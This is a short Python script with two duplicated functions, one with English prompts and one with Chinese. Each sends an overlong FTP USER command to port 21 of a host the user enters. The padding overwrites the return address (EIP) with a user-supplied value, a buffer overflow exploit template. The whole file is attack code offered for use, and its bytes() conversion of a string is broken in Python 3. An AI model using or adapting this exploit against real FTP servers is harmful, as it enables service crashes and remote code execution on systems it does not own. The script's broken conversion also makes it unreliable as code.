def fuzzing6_e():
    import socket
    print ("Please enter target host!")
    hostin = input()
    host = str(hostin)
    if len(host) > 0:
        print ("Please enter EIP address(reverse order)!")
        EIPIN = input()
        EIP = bytes(EIPIN)
        FUZZ = "A" * 230
        junk = "C" * 500
        print("Fuzzing with {} bytes".format(len(FUZZ)))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((host, 21))
        s.recv(1024)
        s.send(b"USER " + FUZZ.encode() + EIP + junk.encode() + b"\r\n")
        s.close()  
    else:
        print ("Error!")
def fuzzing6_c():
    import socket
    print ("请输入目标主机IP！")
    hostin = input()
    host = str(hostin)
    if len(host) > 0:
        print ("请输入EIP地址（倒序）!")
        EIPIN = input()
        EIP = bytes(EIPIN)
        FUZZ = "A" * 230
        junk = "C" * 500
        print("Fuzzing with {} bytes".format(len(FUZZ)))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((host, 21))
        s.recv(1024)
        s.send(b"USER " + FUZZ.encode() + EIP + junk.encode() + b"\r\n")
        s.close()  
    else:
        print ("错误!")